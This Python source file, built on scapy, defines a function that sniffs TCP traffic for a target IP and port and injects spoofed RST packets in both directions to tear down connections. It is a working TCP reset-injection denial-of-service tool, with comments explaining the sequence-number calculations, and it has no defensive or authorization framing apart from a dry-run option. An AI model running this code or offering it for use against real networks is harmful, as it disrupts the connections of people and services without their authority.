from __future__ import annotations

import time
from threading import Event
from typing import Optional

from scapy.all import IP, TCP, conf, get_if_hwaddr, send, sniff  # type: ignore

def sever_connection(
    target_ip: str,
    target_port: Optional[int],
    iface: Optional[str],
    duration: Optional[int] = None,
    dry_run: bool = False,
    stop_event: Optional[Event] = None,
) -> None:
    if iface:
        conf.iface = iface

    # Build BPF filter
    # We want to see TCP packets involving the target
    # If port is specified, filter by port too.
    bpf_filter = f"tcp and host {target_ip}"
    if target_port:
        bpf_filter += f" and port {target_port}"

    my_mac = get_if_hwaddr(conf.iface)
    
    print(f"[*] Severing connections for {target_ip}:{target_port or '*'} on {conf.iface}")
    print(f"[*] Filter: {bpf_filter}")
    print("[*] Press Ctrl+C to stop...")

    # We need to track recently killed seqs to avoid flooding RSTs for the same packet burst
    # (simple dedup could be sequence number based)
    
    def packet_handler(pkt) -> None:
        if stop_event and stop_event.is_set():
            return
            
        if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
            return

        ip = pkt.getlayer(IP)
        tcp = pkt.getlayer(TCP)

        # Only react to packets that have the ACK flag set (most established traffic)
        # Flags "A" = ACK. "P" = PUSH. "S" = SYN. "R" = RST. "F" = FIN.
        # We ignore RST/FIN packets as connection is already closing/closed.
        flags = tcp.flags
        if "R" in flags or "F" in flags:
            return
        
        # We need to spoof a packet coming FROM dst TO src, and FROM src TO dst.
        # But we only see one packet.
        # Packet: SRC -> DST (Seq=S, Ack=A)
        
        # To kill the connection for SRC:
        # We send a packet TO SRC, appearing to come FROM DST.
        # It should look like a valid response.
        # RST packet seq number should match the ACK number of the received packet.
        # RST packet: SRC=DST_IP, DST=SRC_IP, Seq=pkt.ack
        
        # To kill the connection for DST:
        # We send a packet TO DST, appearing to come FROM SRC.
        # RST packet: SRC=SRC_IP, DST=DST_IP, Seq=pkt.seq + payload_len?
        # Actually, simpler is to just send RST with Seq matching expected next seq.
        
        # RST Injection Logic:
        # 1. Spoof RST to SRC (The sender of this packet)
        #    Seq = pkt.ack
        rst_to_src = IP(src=ip.dst, dst=ip.src) / TCP(
            sport=tcp.dport, dport=tcp.sport, flags="R", seq=tcp.ack, window=0
        )
        
        # 2. Spoof RST to DST (The receiver of this packet)
        #    Seq = pkt.seq + (len(payload) if any, else 0)
        #    If we just use pkt.seq, it might be accepted if it's in window.
        #    Best practice: match expected seq.
        payload_len = len(tcp.payload)
        # If payload is empty, seq doesn't advance, so use pkt.seq
        # If SYN/FIN present, they consume 1 seq, but we ignored FIN.
        seq_to_dst = tcp.seq + payload_len
        if "S" in flags:
            seq_to_dst += 1
            
        rst_to_dst = IP(src=ip.src, dst=ip.dst) / TCP(
            sport=tcp.sport, dport=tcp.dport, flags="R", seq=seq_to_dst, window=0
        )

        if dry_run:
            print(f"[dry-run] Injecting RST {ip.src}:{tcp.sport} <-> {ip.dst}:{tcp.dport}")
        else:
            # We use send() at Layer 3 (IP). Scapy handles routing/MAC resolution.
            # verbose=0 to reduce noise
            send(rst_to_src, verbose=0)
            send(rst_to_dst, verbose=0)
            print(f"[+] Sent RST pair: {ip.src}:{tcp.sport} <-> {ip.dst}:{tcp.dport}")

    try:
        sniff(
            filter=bpf_filter,
            prn=packet_handler,
            store=False,
            timeout=duration,
            stop_filter=lambda x: stop_event.is_set() if stop_event else False
        )
    except KeyboardInterrupt:
        pass
